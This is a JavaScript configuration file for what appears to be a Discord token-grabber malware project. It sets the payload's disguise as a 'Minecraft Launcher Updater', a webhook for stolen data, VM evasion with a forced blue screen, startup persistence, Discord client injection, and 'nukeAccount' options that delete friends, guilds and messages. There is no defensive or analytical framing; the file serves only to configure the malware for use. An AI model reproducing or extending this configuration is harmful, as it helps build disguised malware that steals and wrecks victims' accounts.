/**
 * For configuration, see https://github.com/JustYuuto/Grabber/wiki/Configuration
 *
 * @type {{
 *   vmProtect: boolean,
 *   wifiNetworks: boolean,
 *   addToStartup: boolean,
 *   filename: string,
 *   webhook: {
 *     url: string,
 *     content: string
 *   },
 *   discord: {
 *     injectJs: boolean,
 *     uninstall: boolean,
 *     autoJoinGuild: boolean | string,
 *     killProcess: boolean,
 *     autoBuyNitro: boolean,
 *     nukeAccount: {
 *       removeAllFriends: boolean,
 *       sendMessageToAllDMs: boolean | string,
 *       leaveAllGuilds: boolean,
 *       deleteAllOwnedGuilds: boolean
 *     }
 *   },
 *   bsodIfVm: boolean,
 *   name: string,
 *   userAgent: string,
 *   fakeError: boolean
 * }}
 */
module.exports = {
  name: 'Minecraft Launcher Updater',
  filename: 'Updater',
  webhook: {
    url: '<WEBHOOK_URL>',
    content: '@everyone',
  },
  userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
  addToStartup: false,
  vmProtect: false,
  bsodIfVm: true,
  fakeError: false,
  wifiNetworks: false,
  discord: {
    injectJs: false,
    autoBuyNitro: false,
    uninstall: false,
    killProcess: false,
    autoJoinGuild: false,
    nukeAccount: {
      removeAllFriends: false,
      leaveAllGuilds: false,
      deleteAllOwnedGuilds: false,
      sendMessageToAllDMs: false
    }
  }
};
